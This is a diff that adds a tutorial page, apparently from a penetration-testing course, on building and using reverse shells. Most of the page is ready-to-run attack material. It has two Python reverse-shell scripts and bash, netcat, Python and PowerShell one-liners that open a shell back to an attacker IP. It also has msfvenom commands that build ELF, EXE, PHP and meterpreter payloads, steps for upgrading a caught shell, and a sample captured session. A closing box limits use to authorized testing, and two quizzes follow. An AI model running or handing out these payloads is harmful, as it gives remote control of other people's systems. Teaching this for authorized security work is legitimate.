@@ -1,0 +1,191 @@
+---
+title: Reverse Shell in Python
+description: Understanding and building reverse shells for penetration testing.
+---
+
+# Reverse Shell in Python
+
+A reverse shell is a connection initiated from the target back to the attacker. It's used when the target is behind a firewall that blocks incoming connections but allows outgoing ones.
+
+```
+Normal shell:  Attacker → connects to → Target
+Reverse shell: Target → connects back to → Attacker
+```
+
+## How It Works
+
+```
+1. Attacker starts a listener: nc -lvnp 4444
+2. Attacker delivers payload to target (via exploit, upload, etc.)
+3. Target executes payload → connects back to attacker on port 4444
+4. Attacker receives shell → can run commands on target
+```
+
+## Python Reverse Shell (Basic)
+
+```python
+#!/usr/bin/env python3
+import socket
+import subprocess
+import os
+
+LHOST = "10.10.14.5"  # Attacker's IP
+LPORT = 4444
+
+def reverse_shell():
+    # Connect back to attacker
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((LHOST, LPORT))
+
+    # Redirect stdin/stdout/stderr to socket
+    os.dup2(sock.fileno(), 0)  # stdin
+    os.dup2(sock.fileno(), 1)  # stdout
+    os.dup2(sock.fileno(), 2)  # stderr
+
+    # Spawn shell
+    subprocess.call(["/bin/bash", "-i"])
+
+reverse_shell()
+```
+
+## Python Reverse Shell (Interactive)
+
+```python
+#!/usr/bin/env python3
+import socket
+import subprocess
+import threading
+
+LHOST = "10.10.14.5"
+LPORT = 4444
+
+def reverse_shell():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Reconnect on failure
+    while True:
+        try:
+            sock.connect((LHOST, LPORT))
+            break
+        except Exception:
+            import time
+            time.sleep(5)
+
+    def recv_commands():
+        while True:
+            try:
+                cmd = sock.recv(4096).decode("utf-8", errors="ignore").strip()
+                if not cmd:
+                    continue
+                if cmd.lower() == "exit":
+                    break
+
+                # Execute command
+                result = subprocess.run(
+                    cmd,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=30
+                )
+                output = result.stdout + result.stderr
+                if not output:
+                    output = "[No output]\n"
+
+                sock.send(output.encode())
+            except Exception as e:
+                sock.send(f"Error: {e}\n".encode())
+
+    recv_commands()
+    sock.close()
+
+reverse_shell()
+```
+
+<TerminalWindow
+  title="Catching the Reverse Shell"
+  command="nc -lvnp 4444"
+  output="Listening on 0.0.0.0 4444
+Connection received on 10.10.10.5 49234
+whoami
+www-data
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+hostname
+web-server"
+/>
+
+## Upgrading to a Full TTY Shell
+
+A basic reverse shell is limited — no tab completion, no Ctrl+C, no text editors. Upgrade it:
+
+```bash
+# On the target (in the reverse shell)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Or: python -c 'import pty; pty.spawn("/bin/bash")'
+# Or: script /dev/null -c bash
+
+# Press Ctrl+Z to background the shell
+# On your attack machine:
+stty raw -echo; fg
+
+# Back in the shell, set terminal size
+export TERM=xterm
+stty rows 50 columns 200
+```
+
+## One-Liner Reverse Shells
+
+For when you can't upload a file — inject directly into a command:
+
+```bash
+# Bash
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+
+# Python3
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+
+# Netcat (if -e flag available)
+nc -e /bin/bash 10.10.14.5 4444
+
+# Netcat (without -e)
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
+
+# PowerShell (Windows)
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+## Msfvenom — Generating Payloads
+
+```bash
+# Linux ELF reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
+
+# Windows EXE reverse shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
+
+# PHP reverse shell (web upload)
+msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
+
+# Python reverse shell
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw
+
+# Meterpreter (more features)
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o meterpreter.elf
+```
+
+<InfoBox type="important">
+Reverse shells are for authorized penetration testing only. Always use them within the scope of your engagement. Unauthorized access to computer systems is a serious crime.
+</InfoBox>
+
+<Quiz
+  question="Why is a reverse shell preferred over a bind shell when the target is behind a firewall?"
+  answer="Because firewalls typically block incoming connections but allow outgoing ones — the reverse shell connects outward from the target"
+  hint="A bind shell listens on the target (blocked by firewall). A reverse shell connects out (usually allowed)."
+/>
+
+<Quiz
+  question="What Python command upgrades a basic shell to a full TTY?"
+  answer="python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+  hint="pty.spawn() creates a proper pseudo-terminal, enabling features like tab completion."
+/>
